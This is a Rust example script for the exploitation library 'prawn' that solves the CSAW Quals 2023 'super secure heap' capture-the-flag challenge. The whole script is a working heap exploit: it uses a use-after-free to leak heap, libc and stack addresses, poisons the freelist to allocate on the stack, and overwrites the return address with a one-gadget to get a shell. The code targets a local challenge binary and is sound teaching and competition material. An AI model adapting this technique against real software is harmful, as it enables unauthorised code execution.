/*
   prawn Example Script
   CSAW Quals 2023: "super secure heap"
*/

use prawn::process::tubes::Tube;
use prawn::process::*;
use prawn::util::*;

use std::error::Error;

type Result<T> = std::result::Result<T, Box<dyn Error>>;

fn selkey(p: &mut Process, key: bool) -> Result<()> {
   if !key {
       p.sendlineafter(">".into(), "2".into())?;
   } else {
       p.sendlineafter(">".into(), "1".into())?;
   }
   Ok(())
}

fn alloc(p: &mut Process, size: usize, key: bool) -> Result<()> {
    selkey(p, key)?;
    p.sendline("1".into())?;
    p.sendline(format!("{}", size).into())?;
    Ok(())
}

fn delete(p: &mut Process, idx: usize, key: bool) -> Result<()> {
    selkey(p, key)?;
    p.sendline("2".into())?;
    p.sendline(format!("{}", idx).into())?;
    Ok(())
}

fn modify(p: &mut Process, idx: usize, keyno: usize, size: usize, cont: Vec<u8>) -> Result<()> {
    selkey(p, false)?;
    p.sendline("3".into())?;
    p.sendline(format!("{}", idx).into())?;
    p.sendline(format!("{}", keyno).into())?;
    p.sendline(format!("{}", size).into())?;
    p.send(cont)?;
    Ok(())
}

fn kmodify(p: &mut Process, idx: usize, size: usize, cont: Vec<u8>) -> Result<()> {
    selkey(p, true)?;
    p.sendline("3".into())?;
    p.sendline(format!("{}", idx).into())?;
    p.sendline(format!("{}", size).into())?;
    p.sendline(cont)?;
    Ok(())
}

fn show(p: &mut Process, idx: usize, key: bool) -> Result<()> {
    selkey(p, key)?;
    p.sendline("4".into())?;
    p.sendline(format!("{}", idx).into())?;
    Ok(())
}

fn main() -> Result<()> {
    let cfg = ProcessConfig::default();
    let p = &mut Process::new(&["./super_secure_heap_patched"], &cfg)?;

    p.interactive()?;

    // setup key
    let key = b"LOL";
    alloc(p, key.len()+1, true)?;
    kmodify(p, 0, key.len(), key.to_vec())?;

    // uaf to leak a freelist pointer
    let heap_leak = {
        alloc(p, 20, false)?;
        alloc(p, 20, false)?;
        delete(p, 0, false)?;
        delete(p, 1, false)?;

        show(p, 1, false)?;

        p.recvuntil("Here is your content:".into())?;
        p.recvline()?;

        let heap_leak = &mut p.recv(6)?;
        heap_leak.append(&mut vec![0u8, 0]);
        u64(&heap_leak)?
    };
    println!("heap: {:#x}", &heap_leak);

    // uaf to leak an arena pointer from unsorted bin consolidation
    let environ_off = 0x1ef600;
    let libc_leak = {
        alloc(p, 0xec0, false)?;
        alloc(p, 0xec0, false)?;
        delete(p, 2, false)?;
        delete(p, 3, false)?;

        show(p, 2, false)?;

        p.recvuntil("Here is your content:".into())?;
        p.recvline()?;

        let libc_leak = &mut p.recv(6)?;
        libc_leak.append(&mut vec![0u8, 0]);
        u64(&libc_leak)? - 0x1ecbe0
    };
    println!("libc: {:#x}", &libc_leak);

    let environ = libc_leak+environ_off;
    println!("libc environ: {:#x}", &environ);

    // hijack freelist to get an allocation on libc environ to leak stack
    let stack_leak = {
        modify(p, 1, 0, p64(environ)?.len(), p64(environ)?)?;

        alloc(p, 20, false)?;
        alloc(p, 20, false)?;

        show(p, 5, false)?;

        p.recvuntil("Here is your content:".into())?;
        p.recvline()?;

        let stack_leak = &mut p.recv(6)?;
        stack_leak.append(&mut vec![0u8, 0]);
        u64(&stack_leak)?
    };
    println!("stack: {:#x}", &stack_leak);

    // get idx 7 on the freelist
    alloc(p, 32, false)?;
    alloc(p, 32, false)?;
    delete(p, 6, false)?;
    delete(p, 7, false)?;

    // reallocate 7 as a key (keys contents won't be encrypted)
    alloc(p, 32, true)?;

    // free idx 7 again to create a uaf on the previous key chunk
    delete(p, 7, false)?;

    // overwrite the freelist pointer to get an allocation on the stack
    let return_addr = stack_leak - 0x100;
    println!("ret leak: {:#x}", &return_addr);
    kmodify(p, 1, 8, p64(return_addr)?)?;

    // moves hijacked chunk to top of freelist
    alloc(p, 32, false)?;

    // this chunk should be on top of the return addr
    alloc(p, 32, true)?;

    // overwrite return addr with one gadget
    let one_gadget = p64(libc_leak+0xe3b01)?;
    kmodify(p, 2, 31, one_gadget)?;

    // exit and get shell!
    p.sendline("3".into())?;
    p.interactive()?;
    Ok(())
}
